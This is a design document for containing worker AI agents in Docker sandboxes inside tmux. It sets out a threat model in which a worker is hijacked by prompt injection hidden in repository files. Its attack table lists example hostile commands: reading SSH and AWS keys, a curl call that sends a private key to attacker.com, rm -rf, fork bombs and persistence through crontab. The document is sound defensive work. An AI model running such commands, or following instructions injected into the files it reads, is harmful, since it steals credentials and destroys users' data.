# Sandbox Design: Worker Agent Containment

## Threat model

### Attacker profile

The attacker is a **worker agent compromised via prompt injection**. A worker is assigned to work on a codebase that contains malicious instructions embedded in files (README, code comments, docstrings, config files). The LLM follows these instructions and executes harmful commands.

EA and PM agents are **trusted**. They only orchestrate via the HTTP API and do not interact with untrusted code or repositories.

### What a rogue worker can do today

OMAR has no isolation between agents. All agents run as the same Unix user via tmux sessions. A compromised worker can:

| Attack | Example |
|--------|---------|
| Read sensitive files | `cat ~/.ssh/id_rsa`, `cat ~/.aws/credentials` |
| Exfiltrate data | `curl attacker.com -d @~/.ssh/id_rsa` |
| Destroy files outside workspace | `rm -rf ~/Documents` |
| Resource exhaustion | Fork bomb, fill disk |
| Interfere with other agents | `curl localhost:9876/api/agents/pm-1 -X DELETE` |
| Modify OMAR state | Edit `~/.omar/memory.md`, `agent_parents.json` |
| Install persistent backdoors | Add crontab entries, modify `~/.bashrc` |

### What the sandbox blocks

Docker container isolation addresses each attack vector:

| Threat | Mitigation |
|--------|-----------|
| Read sensitive files | Only the workspace directory and agent config are mounted into the container |
| Exfiltrate data | `--network none` — no outbound network at all |
| Destroy files outside workspace | Filesystem is limited to explicit mounts |
| Resource exhaustion | `--memory`, `--pids-limit`, `--cpus` caps |
| Persistent backdoors | `--read-only` root filesystem, container is ephemeral (`--rm`) |
| Kill other agents via API | No network means no access to `localhost:9876` |
| Modify OMAR state | `~/.omar/` is not mounted |

### What the sandbox does NOT address

- **Malicious changes to the workspace.** The agent needs read-write access to the project directory to do its job. A rogue worker can still delete or corrupt files within the workspace it was assigned.
- **Docker escape via kernel exploits.** Container isolation relies on Linux namespaces and cgroups, which have had escape vulnerabilities historically. This is an accepted residual risk for a local dev tool.
- **API key exfiltration within the workspace.** If the workspace itself contains secrets (e.g., `.env` files), the agent can read them. The sandbox cannot distinguish between legitimate file reads and secret theft within the mounted workspace.
- **Agent config credentials.** The agent's own API key (e.g., `~/.claude/`) must be mounted read-only for the agent to function. A rogue agent could read (but not exfiltrate, due to no network) this key.

## Architecture

### Docker-inside-tmux

The key design decision is to run Docker **inside** the tmux session, not tmux inside Docker. This preserves the entire existing dashboard integration:

```
┌─ tmux server (host) ──────────────────────────────────────┐
│                                                            │
│  omar-dashboard session                                    │
│  ├── TUI dashboard (reads tmux panes, send-keys)          │
│  └── HTTP API server (localhost:9876)                      │
│                                                            │
│  omar-ea session (UNSANDBOXED)                             │
│  └── claude --dangerously-skip-permissions                 │
│                                                            │
│  omar-agent-pm-api session (UNSANDBOXED)                   │
│  └── claude --dangerously-skip-permissions                 │
│                                                            │
│  omar-agent-worker-1 session (SANDBOXED)                   │
│  └── docker run --rm -it --name omar-agent-worker-1 ...    │
│       └── claude --dangerously-skip-permissions             │
│                                                            │
│  omar-agent-worker-2 session (SANDBOXED)                   │
│  └── docker run --rm -it --name omar-agent-worker-2 ...    │
│       └── claude --dangerously-skip-permissions             │
└────────────────────────────────────────────────────────────┘
```

The tmux session's command changes from the agent binary directly to a `docker run` invocation that runs the agent binary inside a container. From tmux's perspective, the session just runs a different command — all existing operations (capture-pane, send-keys, kill-session, popup attach) work unchanged.

### Why not tmux-inside-Docker?

Running the entire tmux server inside Docker would break the dashboard's ability to manage sessions. The dashboard uses the host tmux server to enumerate sessions, read pane content, and send keystrokes. Moving tmux into containers would require a complete rewrite of the session management layer.

### Container command

Unsandboxed (EA, PM — current behavior):
```
tmux new-session -d -s omar-agent-pm-api \
  -c /home/user/project \
  claude --dangerously-skip-permissions
```

Sandboxed (workers):
```
tmux new-session -d -s omar-agent-worker-1 \
  docker run --rm -it \
    --name omar-agent-worker-1 \
    --security-opt no-new-privileges \
    --cap-drop ALL \
    --read-only \
    --tmpfs /tmp:rw,noexec,size=512m \
    --memory 4g \
    --pids-limit 256 \
    --network none \
    -v /home/user/project:/workspace:rw \
    -v /usr/local/bin/claude:/usr/local/bin/claude:ro \
    -v /home/user/.claude:/home/agent/.claude:ro \
    -w /workspace \
    ubuntu:22.04 \
    claude --dangerously-skip-permissions
```

### Container security flags

| Flag | Purpose |
|------|---------|
| `--rm` | Auto-remove container on exit (no lingering state) |
| `--security-opt no-new-privileges` | Prevent setuid/setgid escalation |
| `--cap-drop ALL` | Drop all Linux capabilities |
| `--read-only` | Root filesystem is read-only |
| `--tmpfs /tmp:rw,noexec,size=512m` | Writable temp space, no exec, size-limited |
| `--memory 4g` | Memory cap |
| `--pids-limit 256` | Fork bomb protection |
| `--network none` | No network access whatsoever |

### Container lifecycle

1. **Spawn:** `spawn_agent` wraps the agent command in `docker run` for workers
2. **Interact:** `send_keys` sends text to the tmux session, which flows to Docker's PTY (works with `-it`)
3. **Monitor:** `capture-pane` reads the tmux pane output (Docker output passes through)
4. **Kill:** `kill-session` terminates tmux; `docker rm -f` cleans up the container
5. **Exit:** Dashboard exit runs `docker rm -f` on all `omar-agent-*` containers

### Filesystem mounts

| Host path | Container path | Mode | Why |
|-----------|---------------|------|-----|
| Project workspace | `/workspace` | rw | Agent needs to read/write code |
| Agent binary (e.g., `claude`) | Same path | ro | Agent needs its CLI tool |
| Agent config (e.g., `~/.claude/`) | Mapped path | ro | API keys for LLM access |
| (nothing else) | — | — | Everything else is blocked by omission |

Sensitive paths that are **not mounted** (blocked by default):
- `~/.ssh/` — SSH keys
- `~/.aws/` — AWS credentials
- `~/.gnupg/` — GPG keys
- `~/.omar/` — OMAR state
- `~/.*_history` — Shell history

## Configuration

```toml
# ~/.config/omar/config.toml

[sandbox]
enabled = false         # opt-in, off by default
image = "ubuntu:22.04"  # base Docker image

[sandbox.limits]
memory = "4g"
cpus = 2.0
pids_limit = 256

[sandbox.filesystem]
workspace_access = "rw"   # rw | ro
```

When `enabled = false` (default), OMAR behaves exactly as it does today. No Docker dependency.

## Design decisions and trade-offs

### Workers-only sandboxing
EA and PM agents run unsandboxed because they need HTTP access to the OMAR API (`localhost:9876`) to spawn and manage workers. Restricting their network while allowing only API access would require a custom Docker bridge network with iptables rules — significant complexity for minimal security gain, since these agents only run trusted orchestration prompts.

### No custom Docker image (Phase 1)
Rather than requiring users to build a custom image, we bind-mount the agent binary and config from the host. This means zero setup beyond having Docker installed. A pre-built image with common tools could be added later as an optimization.

### `--network none` vs. restricted network for workers
Workers get no network at all rather than a restricted network. This is the simplest and most secure option. If a worker needs to install dependencies (npm install, pip install), the user can either pre-install them in the workspace or disable sandboxing for that specific agent.
